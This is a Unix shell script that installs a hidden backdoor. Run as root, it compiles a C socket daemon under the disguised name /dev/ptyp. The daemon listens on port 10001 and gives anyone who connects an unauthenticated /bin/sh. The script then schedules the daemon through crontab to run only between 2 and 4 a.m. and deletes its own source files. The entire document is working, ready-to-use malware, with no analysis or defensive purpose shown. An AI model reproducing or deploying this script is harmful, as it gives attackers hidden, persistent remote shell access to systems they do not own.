#!/bin/sh
# don't forget.. when you connect to the port.. commands are like:   
# "ls -l;" or "exit;" (don't forget the ';')                         
# Settings:
# Which port should the shell start on?
PORT="10001"
# Where (and under what name) you want to hide the socket demon?
HIDE="/dev/ptyp"
# Time when the socket demon should start (0-23 h, military time!!!) 
START="2"
# Same like above but when should it stop?
STOP="4"
# What compiler to use?
CC="cc"
if  [ ".`whoami`" != ".root" ];  then
  echo "you need to be root to do this!"
  exit 1
fi

echo "Now creating socket demon in " $HIDE

echo "#define PORT " $PORT > socketdemon.c
cat >>socketdemon.c <<'EOF'
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
struct sockaddr_in serv_addr; struct sockaddr_in client_addr;
int main () { soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (soc_des == -1) exit(-1); bzero((char *) &serv_addr, sizeof(serv_addr));
serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
serv_addr.sin_port = htons(PORT); soc_rc = bind(soc_des, (struct sockaddr *)
&serv_addr, sizeof(serv_addr)); if (soc_rc != 0) exit(-1); if (fork() != 0)
exit(0); setpgrp(); signal(SIGHUP, SIG_IGN); if (fork() != 0) exit(0);
soc_rc = listen(soc_des, 5); if (soc_rc != 0) exit(0); while (1) { soc_len =
sizeof(client_addr); soc_cli = accept(soc_des, (struct sockaddr *) &client_addr,
&soc_len); if (soc_cli < 0) exit(0); cli_pid = getpid(); server_pid = fork();
if (server_pid != 0) { dup2(soc_cli,0); dup2(soc_cli,1); dup2(soc_cli,2);
execl("/bin/sh","sh",(char *)0); close(soc_cli); exit(0); } close(soc_cli);}}
EOF
$CC -o $HIDE socketdemon.c

if [ -f $HIDE ]; then
  echo "done"
  rm -f socketdemon.c
else
  echo "unable to compile socketdemon"
  rm -f socketdemon.c
  exit 1
fi
echo "STARTTIME = "$START"; ENDTIME = "$STOP"h"
echo "*" $START "* * *" $HIDE > crontabfile
echo "*" $STOP "* * * killall -9 "$HIDE >> crontabfile
crontab crontabfile
rm -f crontabfile
